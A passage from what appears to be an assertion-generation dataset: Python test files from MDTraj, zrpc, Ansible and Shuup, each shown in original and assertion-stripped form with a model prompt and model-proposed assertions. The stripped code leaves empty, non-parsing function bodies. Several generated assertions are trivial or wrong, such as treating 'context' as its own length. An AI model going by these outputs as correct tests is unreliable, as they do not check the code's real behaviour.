51    bonds[:, -2:] = np.zeros([bonds.shape[0], 2])
52    eq(bonds, ref_bonds)
53
54
55@pytest.mark.skipif(find_executable('obabel') is None, reason='Requires obabel')
56@pytest.mark.skipif(os.environ.get(""TRAVIS"", None) == 'true', reason=""Skip on Travis."")
57def test_load_freesolv_gaffmol2_vs_sybylmol2_vs_obabelpdb(get_fn, tmpdir):
58    tar_filename = ""freesolve_v0.3.tar.bz2""
59    tar = tarfile.open(get_fn(tar_filename), mode=""r:bz2"")
60    os.chdir(str(tmpdir))
61    tar.extractall()
62    tar.close()
63
64    with open(""./v0.3/database.pickle"", 'rb') as f:
65        database = pickle.load(f, encoding='latin-1')
66
67    for key in database:
68        gaff_filename = ""./v0.3/mol2files_gaff/%s.mol2"" % key
69        pdb_filename = ""./v0.3/mol2files_gaff/%s.pdb"" % key
70        sybyl_filename = ""./v0.3/mol2files_sybyl/%s.mol2"" % key
71
72        cmd = ""obabel -imol2 %s -opdb > %s 2>/dev/null"" % (sybyl_filename, pdb_filename)
73
74        t_pdb = md.load(pdb_filename)
75        t_gaff = md.load(gaff_filename)
76        t_sybyl = md.load(sybyl_filename)
77
78        eq(t_pdb.n_atoms, t_gaff.n_atoms)
79        eq(t_pdb.n_atoms, t_sybyl.n_atoms)
80
81        eq(t_pdb.n_frames, t_gaff.n_frames)
82        eq(t_pdb.n_frames, t_gaff.n_frames)
83
84        eq(t_pdb.xyz, t_gaff.xyz, decimal=4)
85        eq(t_pdb.xyz, t_sybyl.xyz, decimal=4)
86
87        top_pdb, bonds_pdb = t_pdb.top.to_dataframe()
88        top_gaff, bonds_gaff = t_gaff.top.to_dataframe()
89        top_sybyl, bonds_sybyl = t_sybyl.top.to_dataframe()
90
91        eq(top_sybyl.name.values, top_pdb.name.values)
92
93        # eq(top_gaff.name.values, top_sybyl.name.values)  # THEY CAN HAVE DIFFERENT NAMES, so this isn't TRUE!
94
95        def make_bonds_comparable(bond_array):
96            """"""Create a bond connectivity matrix from a numpy array of atom pairs.  Avoids having to compare the order in which bonds are listed.""""""
97            n_bonds = len(bond_array)
98            data = np.ones(n_bonds)
99            i = bond_array[:, 0]
100            j = bond_array[:, 1]
101            matrix = scipy.sparse.coo_matrix((data, (i, j)), shape=(t_pdb.n_atoms, t_pdb.n_atoms)).toarray()
102            return matrix + matrix.T  # Symmetrize to account for (a ~ b) versus (b ~ a)
103
104        bond_matrix_pdb = make_bonds_comparable(bonds_pdb)
105        bond_matrix_gaff = make_bonds_comparable(bonds_gaff)
106        bond_matrix_sybyl = make_bonds_comparable(bonds_sybyl)
107
108        eq(bond_matrix_pdb, bond_matrix_gaff)
109        eq(bond_matrix_pdb, bond_matrix_sybyl)
110
111        # Third row from mol2 file copied below, used in testing.
112        #       3 N1          8.5150   -0.1620    1.3310 n3        1 LIG     -0.732600
113
114
115def test_mol2_dataframe(get_fn):
116    top, bonds = mol2.mol2_to_dataframes(get_fn(""imatinib.mol2""))
117    eq(top.name[2], ""N1"")
118    eq(top.atype[2], ""n3"")
119    eq(top.resName[2], ""LIG"")
120    eq(float(top.charge[2]), -0.732600)
121
122
123def test_mol2_dataframe_status(get_fn):
124    atoms, bonds = mol2.mol2_to_dataframes(get_fn('adp.mol2'))
125
126
127def test_mol2_warnings(get_fn):
128    trj = md.load_mol2(get_fn('lysozyme-ligand-tripos.mol2'))
129
130
131def test_mol2_status_bits(get_fn):
132    trj = md.load_mol2(get_fn('status-bits.mol2'))
133    eq(trj.topology.n_atoms, 18)
134    eq(trj.topology.n_bonds, 18)
135
136
137def test_mol2_without_bonds(get_fn):
138    trj = md.load_mol2(get_fn('li.mol2'))
139
140
141
142def test_mol2_element_name(get_fn):
143    trj = md.load_mol2(get_fn('cl.mol2'))
144    top, bonds = trj.top.to_dataframe()
145
146    
147@pytest.mark.parametrize('mol2_file', [('li.mol2'),
148('lysozyme-ligand-tripos.mol2'), ('imatinib.mol2'),
149('status-bits.mol2'), ('adp.mol2'), ('water_acn.mol2')])
150def test_load_all_mol2(mol2_file, get_fn):
151    trj = md.load_mol2(get_fn(mol2_file))
152
153def test_mol2_n_residues(get_fn):
154    trj = md.load_mol2(get_fn('water_acn.mol2'))
155","[['os.system(cmd)', '==', '0'], [""atoms['charge'][1]"", '==', '1.3672'], [""atoms['status'][1]"", '==', ""'****'""], ['trj.topology.n_bonds', '==', '0'], [""top.iloc[0]['element']"", '==', ""'Cl'""], ['trj.n_residues', '==', '10']]",6,6,1.0,0.0010369858278603,"['get_fn', 'trj', 'ref_trj', 'ref_top', 'ref_bonds', 'top', 'bonds', 'bonds[:', '-2:]', 'tmpdir', 'tar_filename', 'tar', 'database', 'gaff_filename', 'pdb_filename', 'sybyl_filename', 'cmd', 't_pdb', 't_gaff', 't_sybyl', 'top_pdb', 'bonds_pdb', 'top_gaff', 'bonds_gaff', 'top_sybyl', 'bonds_sybyl', 'bond_array', 'n_bonds', 'data', 'i', 'j', 'matrix', 'bond_matrix_pdb', 'bond_matrix_gaff', 'bond_matrix_sybyl', 'atoms', 'mol2_file']",37,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['get_fn', 'trj', 'ref_trj', 'ref_top', 'ref_bonds', 'top', 'bonds', 'bonds[:', '-2:]', 'tmpdir', 'tar_filename', 'tar', 'database', 'gaff_filename', 'pdb_filename', 'sybyl_filename', 'cmd', 't_pdb', 't_gaff', 't_sybyl', 'top_pdb', 'bonds_pdb', 'top_gaff', 'bonds_gaff', 'top_sybyl', 'bonds_sybyl', 'bond_array', 'n_bonds', 'data', 'i', 'j', 'matrix', 'bond_matrix_pdb', 'bond_matrix_gaff', 'bond_matrix_sybyl', 'atoms', 'mol2_file']
*Code:

1##############################################################################
2# MDTraj: A Python Library for Loading, Saving, and Manipulating
3#         Molecular Dynamics Trajectories.
4# Copyright 2012-2013 Stanford University and the Authors
5#
6# Authors: Kyle A. Beauchamp
7# Contributors:
8#
9# MDTraj is free software: you can redistribute it and/or modify
10# it under the terms of the GNU Lesser General Public License as
11# published by the Free Software Foundation, either version 2.1
12# of the License, or (at your option) any later version.
13#
14# This library is distributed in the hope that it will be useful,
15# but WITHOUT ANY WARRANTY; without even the implied warranty of
16# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
17# GNU Lesser General Public License for more details.
18#
19# You should have received a copy of the GNU Lesser General Public
20# License along with MDTraj. If not, see <http://www.gnu.org/licenses/>.
21##############################################################################
22
23import mdtraj as md
24from mdtraj.testing import eq
25from mdtraj.formats import mol2
26from distutils.spawn import find_executable
27import tarfile
28import pickle
29import os
30import numpy as np
31import scipy.sparse
32import pytest
33
34
35def test_load_mol2(get_fn):
36    trj = md.load(get_fn('imatinib.mol2'))
37    ref_trj = md.load(get_fn('imatinib.pdb'))
38    eq(trj.xyz, ref_trj.xyz)
39
40    ref_top, ref_bonds = ref_trj.top.to_dataframe()
41    top, bonds = trj.top.to_dataframe()
42    # PDB Does not have bond order, ensure that the equality fails
43    try:
44        eq(bonds, ref_bonds)
45    except AssertionError:
46        # This is what we wanted to happen, its fine
47        pass
48    else:
49        raise AssertionError(""Reference bonds with no bond order should not equal Mol2 bonds with bond order"")
50    # Strip bond order info since PDB does not have it
51    bonds[:, -2:] = np.zeros([bonds.shape[0], 2])
52    eq(bonds, ref_bonds)
53
54
55@pytest.mark.skipif(find_executable('obabel') is None, reason='Requires obabel')
56@pytest.mark.skipif(os.environ.get(""TRAVIS"", None) == 'true', reason=""Skip on Travis."")
57def test_load_freesolv_gaffmol2_vs_sybylmol2_vs_obabelpdb(get_fn, tmpdir):
58    tar_filename = ""freesolve_v0.3.tar.bz2""
59    tar = tarfile.open(get_fn(tar_filename), mode=""r:bz2"")
60    os.chdir(str(tmpdir))
61    tar.extractall()
62    tar.close()
63
64    with open(""./v0.3/database.pickle"", 'rb') as f:
65        database = pickle.load(f, encoding='latin-1')
66
67    for key in database:
68        gaff_filename = ""./v0.3/mol2files_gaff/%s.mol2"" % key
69        pdb_filename = ""./v0.3/mol2files_gaff/%s.pdb"" % key
70        sybyl_filename = ""./v0.3/mol2files_sybyl/%s.mol2"" % key
71
72        cmd = ""obabel -imol2 %s -opdb > %s 2>/dev/null"" % (sybyl_filename, pdb_filename)
73
74        t_pdb = md.load(pdb_filename)
75        t_gaff = md.load(gaff_filename)
76        t_sybyl = md.load(sybyl_filename)
77
78        eq(t_pdb.n_atoms, t_gaff.n_atoms)
79        eq(t_pdb.n_atoms, t_sybyl.n_atoms)
80
81        eq(t_pdb.n_frames, t_gaff.n_frames)
82        eq(t_pdb.n_frames, t_gaff.n_frames)
83
84        eq(t_pdb.xyz, t_gaff.xyz, decimal=4)
85        eq(t_pdb.xyz, t_sybyl.xyz, decimal=4)
86
87        top_pdb, bonds_pdb = t_pdb.top.to_dataframe()
88        top_gaff, bonds_gaff = t_gaff.top.to_dataframe()
89        top_sybyl, bonds_sybyl = t_sybyl.top.to_dataframe()
90
91        eq(top_sybyl.name.values, top_pdb.name.values)
92
93        # eq(top_gaff.name.values, top_sybyl.name.values)  # THEY CAN HAVE DIFFERENT NAMES, so this isn't TRUE!
94
95        def make_bonds_comparable(bond_array):
96            """"""Create a bond connectivity matrix from a numpy array of atom pairs.  Avoids having to compare the order in which bonds are listed.""""""
97            n_bonds = len(bond_array)
98            data = np.ones(n_bonds)
99            i = bond_array[:, 0]
100            j = bond_array[:, 1]
101            matrix = scipy.sparse.coo_matrix((data, (i, j)), shape=(t_pdb.n_atoms, t_pdb.n_atoms)).toarray()
102            return matrix + matrix.T  # Symmetrize to account for (a ~ b) versus (b ~ a)
103
104        bond_matrix_pdb = make_bonds_comparable(bonds_pdb)
105        bond_matrix_gaff = make_bonds_comparable(bonds_gaff)
106        bond_matrix_sybyl = make_bonds_comparable(bonds_sybyl)
107
108        eq(bond_matrix_pdb, bond_matrix_gaff)
109        eq(bond_matrix_pdb, bond_matrix_sybyl)
110
111        # Third row from mol2 file copied below, used in testing.
112        #       3 N1          8.5150   -0.1620    1.3310 n3        1 LIG     -0.732600
113
114
115def test_mol2_dataframe(get_fn):
116    top, bonds = mol2.mol2_to_dataframes(get_fn(""imatinib.mol2""))
117    eq(top.name[2], ""N1"")
118    eq(top.atype[2], ""n3"")
119    eq(top.resName[2], ""LIG"")
120    eq(float(top.charge[2]), -0.732600)
121
122
123def test_mol2_dataframe_status(get_fn):
124    atoms, bonds = mol2.mol2_to_dataframes(get_fn('adp.mol2'))
125
126
127def test_mol2_warnings(get_fn):
128    trj = md.load_mol2(get_fn('lysozyme-ligand-tripos.mol2'))
129
130
131def test_mol2_status_bits(get_fn):
132    trj = md.load_mol2(get_fn('status-bits.mol2'))
133    eq(trj.topology.n_atoms, 18)
134    eq(trj.topology.n_bonds, 18)
135
136
137def test_mol2_without_bonds(get_fn):
138    trj = md.load_mol2(get_fn('li.mol2'))
139
140
141
142def test_mol2_element_name(get_fn):
143    trj = md.load_mol2(get_fn('cl.mol2'))
144    top, bonds = trj.top.to_dataframe()
145
146    
147@pytest.mark.parametrize('mol2_file', [('li.mol2'),
148('lysozyme-ligand-tripos.mol2'), ('imatinib.mol2'),
149('status-bits.mol2'), ('adp.mol2'), ('water_acn.mol2')])
150def test_load_all_mol2(mol2_file, get_fn):
151    trj = md.load_mol2(get_fn(mol2_file))
152
153def test_mol2_n_residues(get_fn):
154    trj = md.load_mol2(get_fn('water_acn.mol2'))
155",7731,"[[35, 'get_fn', '!=', None, ""Function get_fn must be available for test_load_mol2""],
 [57, 'get_fn', '!=', None, ""Function get_fn must be available for test_load_freesolv_gaffmol2_vs_sybylmol2_vs_obabelpdb""],
 [57, 'tmpdir', '!=', None, ""tmpdir must be a valid directory for operations""],
 [115, 'get_fn', '!=', None, ""Function get_fn must be available for test_mol2_dataframe""],
 [123, 'get_fn', '!=', None, ""Function get_fn must be available for test_mol2_dataframe_status""],
 [127, 'get_fn', '!=', None, ""Function get_fn must be available for test_mol2_warnings""],
 [131, 'get_fn', '!=', None, ""Function get_fn must be available for test_mol2_status_bits""],
 [137, 'get_fn', '!=', None, ""Function get_fn must be available for test_mol2_without_bonds""],
 [142, 'get_fn', '!=', None, ""Function get_fn must be available for test_mol2_element_name""],
 [150, 'get_fn', '!=', None, ""Function get_fn must be available for test_load_all_mol2""],
 [150, 'mol2_file', '!=', None, ""mol2_file must be a valid file for operations""],
 [153, 'get_fn', '!=', None, ""Function get_fn must be available for test_mol2_n_residues""]]"
zacharyvoase/zrpc,"from __future__ import with_statement

import unittest

from bson import BSON
from ludibrio import Mock
from ludibrio.matcher import instance_of
from nose.tools import assert_raises
import zmq

from zrpc.client import Client, Error


def mock_context(response):
    with Mock() as context:
        context.__len__() >> 1
        socket = context.socket(zmq.REQ)
        socket.connect('inproc://zrpc')
        socket.send(instance_of(str))
        socket.recv() >> BSON.encode(response)
    return context


def test_client_returns_result_on_success():
    context = mock_context(
        response={""id"": ""abc"", ""result"": 7, ""error"": None})

    client = Client('inproc://zrpc', context=context)
    assert client.add(3, 4) == 7
    context.validate()


def test_client_raises_exception_on_failure():
    context = mock_context(
        response={""id"": ""abc"", ""result"": None,
                  ""error"": {""type"": ""exceptions.TypeError"",
                            ""message"": ""TypeError: add expected 2 arguments, got 1"",
                            ""args"": [""add expected 2 arguments, got 1""]}})

    client = Client('inproc://zrpc', context=context)
    assert_raises(Error, client.add, 3)
    context.validate()


def test_dotted_names_resolve_to_dotted_methods():
    context = mock_context(
        response={""id"": ""abc"", ""result"": 7, ""error"": None})

    client = Client('inproc://zrpc', context=context)
    assert client.math.add(3, 4) == 7
    context.validate()


class ClientErrorTest(unittest.TestCase):

    def setUp(self):
        self.exc = Error(
            request={""id"": ""abc"", ""method"": ""add"", ""params"": [1]},
            response={""id"": ""abc"", ""result"": None,
                      ""error"": {""type"": ""exceptions.TypeError"",
                                ""message"": ""TypeError: add expected 2 arguments, got 1"",
                                ""args"": [""add expected 2 arguments, got 1""]}})

    def test_error_is_a_subclass_of_dynamically_created_classes(self):
        assert isinstance(self.exc, Error)
        assert isinstance(self.exc, Error.TypeError)
        assert isinstance(self.exc, Error['TypeError'])
        assert isinstance(self.exc, Error['exceptions.TypeError'])

    def test_error_stores_request_info(self):
        assert self.exc.id == ""abc""
        assert self.exc.method == ""add""
        assert self.exc.params == [1]

    def test_error_stores_exc_info(self):
        assert self.exc.type == ""exceptions.TypeError""
        assert self.exc.message == ""TypeError: add expected 2 arguments, got 1""
        assert self.exc.args == [""add expected 2 arguments, got 1""]
","
1from __future__ import with_statement
2
3import unittest
4
5from bson import BSON
6from ludibrio import Mock
7from ludibrio.matcher import instance_of
8import zmq
9
10from zrpc.client import Client, Error
11
12
13def mock_context(response):
14    with Mock() as context:
15        context.__len__() >> 1
16        socket = context.socket(zmq.REQ)
17        socket.connect('inproc://zrpc')
18        socket.send(instance_of(str))
19        socket.recv() >> BSON.encode(response)
20    return context
21
22
23def test_client_returns_result_on_success():
24    context = mock_context(
25        response={""id"": ""abc"", ""result"": 7, ""error"": None})
26
27    client = Client('inproc://zrpc', context=context)
28    context.validate()
29
30
31def test_client_raises_exception_on_failure():
32    context = mock_context(
33        response={""id"": ""abc"", ""result"": None,
34                  ""error"": {""type"": ""exceptions.TypeError"",
35                            ""message"": ""TypeError: add expected 2 arguments, got 1"",
36                            ""args"": [""add expected 2 arguments, got 1""]}})
37
38    client = Client('inproc://zrpc', context=context)
39    context.validate()
40
41
42def test_dotted_names_resolve_to_dotted_methods():
43    context = mock_context(
44        response={""id"": ""abc"", ""result"": 7, ""error"": None})
45
46    client = Client('inproc://zrpc', context=context)
47    context.validate()
48
49
50class ClientErrorTest(unittest.TestCase):
51
52    def setUp(self):
53        self.exc = Error(
54            request={""id"": ""abc"", ""method"": ""add"", ""params"": [1]},
55            response={""id"": ""abc"", ""result"": None,
56                      ""error"": {""type"": ""exceptions.TypeError"",
57                                ""message"": ""TypeError: add expected 2 arguments, got 1"",
58                                ""args"": [""add expected 2 arguments, got 1""]}})
59
60    def test_error_is_a_subclass_of_dynamically_created_classes(self):
61
62    def test_error_stores_request_info(self):
63
64    def test_error_stores_exc_info(self):
65","[['client.add(3', '==', 'True'], ['client.math.add(3', '==', 'True'], ['self.exc.id', '==', '""abc""'], ['self.exc.method', '==', '""add""'], ['self.exc.params', '==', '[1]'], ['self.exc.type', '==', '""exceptions.TypeError""'], ['self.exc.message', '==', '""TypeError: add expected 2 arguments'], ['self.exc.args', '==', '[""add expected 2 arguments']]",14,8,0.5714285714285714,0.0030639601685178,"['response', 'socket', 'context', 'client', 'self.exc']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['response', 'socket', 'context', 'client', 'self.exc']
*Code:

1from __future__ import with_statement
2
3import unittest
4
5from bson import BSON
6from ludibrio import Mock
7from ludibrio.matcher import instance_of
8import zmq
9
10from zrpc.client import Client, Error
11
12
13def mock_context(response):
14    with Mock() as context:
15        context.__len__() >> 1
16        socket = context.socket(zmq.REQ)
17        socket.connect('inproc://zrpc')
18        socket.send(instance_of(str))
19        socket.recv() >> BSON.encode(response)
20    return context
21
22
23def test_client_returns_result_on_success():
24    context = mock_context(
25        response={""id"": ""abc"", ""result"": 7, ""error"": None})
26
27    client = Client('inproc://zrpc', context=context)
28    context.validate()
29
30
31def test_client_raises_exception_on_failure():
32    context = mock_context(
33        response={""id"": ""abc"", ""result"": None,
34                  ""error"": {""type"": ""exceptions.TypeError"",
35                            ""message"": ""TypeError: add expected 2 arguments, got 1"",
36                            ""args"": [""add expected 2 arguments, got 1""]}})
37
38    client = Client('inproc://zrpc', context=context)
39    context.validate()
40
41
42def test_dotted_names_resolve_to_dotted_methods():
43    context = mock_context(
44        response={""id"": ""abc"", ""result"": 7, ""error"": None})
45
46    client = Client('inproc://zrpc', context=context)
47    context.validate()
48
49
50class ClientErrorTest(unittest.TestCase):
51
52    def setUp(self):
53        self.exc = Error(
54            request={""id"": ""abc"", ""method"": ""add"", ""params"": [1]},
55            response={""id"": ""abc"", ""result"": None,
56                      ""error"": {""type"": ""exceptions.TypeError"",
57                                ""message"": ""TypeError: add expected 2 arguments, got 1"",
58                                ""args"": [""add expected 2 arguments, got 1""]}})
59
60    def test_error_is_a_subclass_of_dynamically_created_classes(self):
61
62    def test_error_stores_request_info(self):
63
64    def test_error_stores_exc_info(self):
65",3484,"[[13, 'response', '!=', None, ""the response should not be None""],
 [24, 'context', '!=', None, ""the context should not be None""],
 [28, 'context', '==', 1, ""the context's length should be 1""],
 [27, 'client', '!=', None, ""the client should not be None""],
 [32, 'context', '!=', None, ""the context should not be None""],
 [38, 'context', '==', 1, ""the context's length should be 1""],
 [37, 'client', '!=', None, ""the client should not be None""],
 [43, 'context', '!=', None, ""the context should not be None""],
 [47, 'context', '==', 1, ""the context's length should be 1""],
 [46, 'client', '!=', None, ""the client should not be None""],
 [53, 'self.exc', '!=', None, ""the exception should not be None""]]"
helldorado/ansible,"#!/usr/bin/env python

import json
import sys


def check_hosts(contrib, plugin):
    contrib_hosts = sorted(contrib['_meta']['hostvars'].keys())
    plugin_hosts = sorted(plugin['_meta']['hostvars'].keys())
    assert contrib_hosts == plugin_hosts
    return contrib_hosts, plugin_hosts


def check_groups(contrib, plugin):
    contrib_groups = set(contrib.keys())
    plugin_groups = set(plugin.keys())
    missing_groups = contrib_groups.difference(plugin_groups)
    if missing_groups:
        print(""groups: %s are missing from the plugin"" % missing_groups)
    assert not missing_groups
    return contrib_groups, plugin_groups


def check_host_vars(key, value, plugin, host):
    # tags are a dict in the plugin
    if key.startswith('ec2_tag'):
        print('assert tag', key, value)
        assert 'tags' in plugin['_meta']['hostvars'][host], 'b file does not have tags in host'
        btags = plugin['_meta']['hostvars'][host]['tags']
        tagkey = key.replace('ec2_tag_', '')
        assert tagkey in btags, '%s tag not in b file host tags' % tagkey
        assert value == btags[tagkey], '%s != %s' % (value, btags[tagkey])
    else:
        print('assert var', key, value, key in plugin['_meta']['hostvars'][host], plugin['_meta']['hostvars'][host].get(key))
        assert key in plugin['_meta']['hostvars'][host], ""%s not in b's %s hostvars"" % (key, host)
        assert value == plugin['_meta']['hostvars'][host][key], ""%s != %s"" % (value, plugin['_meta']['hostvars'][host][key])


def main():
    # a should be the source of truth (the script output)
    a = sys.argv[1]
    # b should be the thing to check (the plugin output)
    b = sys.argv[2]

    with open(a, 'r') as f:
        adata = json.loads(f.read())
    with open(b, 'r') as f:
        bdata = json.loads(f.read())

    # all hosts should be present obviously
    ahosts, bhosts = check_hosts(adata, bdata)

    # all groups should be present obviously
    agroups, bgroups = check_groups(adata, bdata)

    # check host vars can be reconstructed
    for ahost in ahosts:
        contrib_host_vars = adata['_meta']['hostvars'][ahost]
        for key, value in contrib_host_vars.items():
            check_host_vars(key, value, bdata, ahost)


if __name__ == ""__main__"":
    main()
","
1#!/usr/bin/env python
2
3import json
4import sys
5
6
7def check_hosts(contrib, plugin):
8    contrib_hosts = sorted(contrib['_meta']['hostvars'].keys())
9    plugin_hosts = sorted(plugin['_meta']['hostvars'].keys())
10    return contrib_hosts, plugin_hosts
11
12
13def check_groups(contrib, plugin):
14    contrib_groups = set(contrib.keys())
15    plugin_groups = set(plugin.keys())
16    missing_groups = contrib_groups.difference(plugin_groups)
17    if missing_groups:
18        print(""groups: %s are missing from the plugin"" % missing_groups)
19    return contrib_groups, plugin_groups
20
21
22def check_host_vars(key, value, plugin, host):
23    # tags are a dict in the plugin
24    if key.startswith('ec2_tag'):
25        btags = plugin['_meta']['hostvars'][host]['tags']
26        tagkey = key.replace('ec2_tag_', '')
27    else:
28
29
30def main():
31    # a should be the source of truth (the script output)
32    a = sys.argv[1]
33    # b should be the thing to check (the plugin output)
34    b = sys.argv[2]
35
36    with open(a, 'r') as f:
37        adata = json.loads(f.read())
38    with open(b, 'r') as f:
39        bdata = json.loads(f.read())
40
41    # all hosts should be present obviously
42    ahosts, bhosts = check_hosts(adata, bdata)
43
44    # all groups should be present obviously
45    agroups, bgroups = check_groups(adata, bdata)
46
47    # check host vars can be reconstructed
48    for ahost in ahosts:
49        contrib_host_vars = adata['_meta']['hostvars'][ahost]
50        for key, value in contrib_host_vars.items():
51            check_host_vars(key, value, bdata, ahost)
52
53
54if __name__ == ""__main__"":
55    main()
56","[['contrib_hosts', '==', 'plugin_hosts'], ['missing_groups', '==', 'False'], ['value', '==', 'btags[tagkey]'], ['value', '==', ""plugin['_meta']['hostvars'][host][key]""]]",9,4,0.4444444444444444,0.0017644464049404,"['contrib', 'plugin', 'contrib_hosts', 'plugin_hosts', 'contrib_groups', 'plugin_groups', 'missing_groups', 'key', 'value', 'host', 'btags', 'tagkey', 'a', 'b', 'adata', 'bdata', 'ahosts', 'bhosts', 'agroups', 'bgroups', 'contrib_host_vars']",21,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['contrib', 'plugin', 'contrib_hosts', 'plugin_hosts', 'contrib_groups', 'plugin_groups', 'missing_groups', 'key', 'value', 'host', 'btags', 'tagkey', 'a', 'b', 'adata', 'bdata', 'ahosts', 'bhosts', 'agroups', 'bgroups', 'contrib_host_vars']
*Code:

1#!/usr/bin/env python
2
3import json
4import sys
5
6
7def check_hosts(contrib, plugin):
8    contrib_hosts = sorted(contrib['_meta']['hostvars'].keys())
9    plugin_hosts = sorted(plugin['_meta']['hostvars'].keys())
10    return contrib_hosts, plugin_hosts
11
12
13def check_groups(contrib, plugin):
14    contrib_groups = set(contrib.keys())
15    plugin_groups = set(plugin.keys())
16    missing_groups = contrib_groups.difference(plugin_groups)
17    if missing_groups:
18        print(""groups: %s are missing from the plugin"" % missing_groups)
19    return contrib_groups, plugin_groups
20
21
22def check_host_vars(key, value, plugin, host):
23    # tags are a dict in the plugin
24    if key.startswith('ec2_tag'):
25        btags = plugin['_meta']['hostvars'][host]['tags']
26        tagkey = key.replace('ec2_tag_', '')
27    else:
28
29
30def main():
31    # a should be the source of truth (the script output)
32    a = sys.argv[1]
33    # b should be the thing to check (the plugin output)
34    b = sys.argv[2]
35
36    with open(a, 'r') as f:
37        adata = json.loads(f.read())
38    with open(b, 'r') as f:
39        bdata = json.loads(f.read())
40
41    # all hosts should be present obviously
42    ahosts, bhosts = check_hosts(adata, bdata)
43
44    # all groups should be present obviously
45    agroups, bgroups = check_groups(adata, bdata)
46
47    # check host vars can be reconstructed
48    for ahost in ahosts:
49        contrib_host_vars = adata['_meta']['hostvars'][ahost]
50        for key, value in contrib_host_vars.items():
51            check_host_vars(key, value, bdata, ahost)
52
53
54if __name__ == ""__main__"":
55    main()
56",3286,"[[7, 'contrib', '!=', None, ""function check_hosts requires a non-null input 'contrib'""],
[7, 'plugin', '!=', None, ""function check_hosts requires a non-null input 'plugin'""],
[13, 'contrib', '!=', None, ""function check_groups requires a non-null input 'contrib'""],
[13, 'plugin', '!=', None, ""function check_groups requires a non-null input 'plugin'""],
[22, 'key', '!=', None, ""function check_host_vars requires a non-null input 'key'""],
[22, 'value', '!=', None, ""function check_host_vars requires a non-null input 'value'""],
[22, 'plugin', '!=', None, ""function check_host_vars requires a non-null input 'plugin'""],
[22, 'host', '!=', None, ""function check_host_vars requires a non-null input 'host'""],
[31, 'a', '!=', None, ""'a' must be a non-null value""],
[34, 'b', '!=', None, ""'b' must be a non-null value""],
[10, 'contrib_hosts', '==', 'plugin_hosts', 'contrib_hosts and plugin_hosts should have the same size'],
[19, 'contrib_groups', '==', 'plugin_groups', 'contrib_groups and plugin_groups should have the same size'],
[42, 'ahosts', '==', 'bhosts', 'ahosts and bhosts should have the same size'],
[45, 'agroups', '==', 'bgroups', 'agroups and bgroups should have the same size']]"
shawnadelic/shuup,"# -*- coding: utf-8 -*-
# This file is part of Shuup.
#
# Copyright (c) 2012-2016, Shoop Ltd. All rights reserved.
#
# This source code is licensed under the AGPLv3 license found in the
# LICENSE file in the root directory of this source tree.
from __future__ import unicode_literals

from decimal import Decimal

from django.utils import translation

from shuup.core.templatetags.shuup_common import money, number, percent
from shuup.utils.money import Money


def nbsp(x):
    """"""
    Convert space to non-breaking space.
    """"""
    return x.replace("" "", ""\xa0"")

def usd(value):
    """"""
    Get Money with USD currency for given value.
    """"""
    return Money(value, ""USD"")


def test_number_formatters_en():
    with translation.override(""en-US""):
        assert percent(Decimal(""0.38"")) == ""38%""
        assert number(Decimal(""38.00000"")) == ""38""
        assert number(Decimal(""38.05000"")) == ""38.05""


def test_number_formatters_fi():
    with translation.override(""fi-FI""):
        assert percent(Decimal(""0.38"")) == nbsp(""38 %"")
        assert number(Decimal(""38.00000"")) == ""38""
        assert number(Decimal(""38.05000"")) == ""38,05""


def en_percent(num, ndigits=""not-given""):
    """"""
    Format given number as percent in en-US locale.
    """"""
    with translation.override(""en-US""):
        if ndigits == ""not-given"":
            return percent(Decimal(num))
        else:
            return percent(Decimal(num), ndigits)


def test_percent_formatter_simple():
    assert en_percent(""0.1"") == ""10%""
    assert en_percent(""0.16"") == ""16%""
